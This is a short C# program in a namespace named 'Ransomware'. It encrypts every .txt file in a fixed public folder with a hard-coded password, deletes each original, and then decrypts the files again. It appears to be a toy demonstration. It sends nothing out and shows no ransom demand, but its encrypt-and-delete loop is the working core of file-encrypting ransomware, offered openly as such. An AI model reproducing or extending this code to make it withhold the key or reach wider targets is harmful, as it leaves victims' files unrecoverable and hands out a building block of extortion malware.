using System;
using SharpAESCrypt;

namespace Ransomware;

class Program
{
    static void Main(string[] args)
    {
        string dir = @"C:/Users/Public/My Files/";
        List<string> files = new List<string>();
        DirectoryInfo d = new DirectoryInfo(dir);
        
        // Build out list of files
        foreach (var file in d.GetFiles("*.txt"))
        {
            files.Add(file.ToString());
        }

        //// Encrypt all files
        foreach (string file in files)
        {
            string encrypted_file = dir + "encrypted_file.txt";
            SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encrypted_file);
            File.Delete(file);
            File.Move(encrypted_file, file);
        }

        // Decrypt all files
        foreach (string file in files)
        {
            string decrypted_file = dir + "decrypted_file.txt";
            SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decrypted_file);
            File.Delete(file);
            File.Move(decrypted_file, file);
        }
              
    }
}
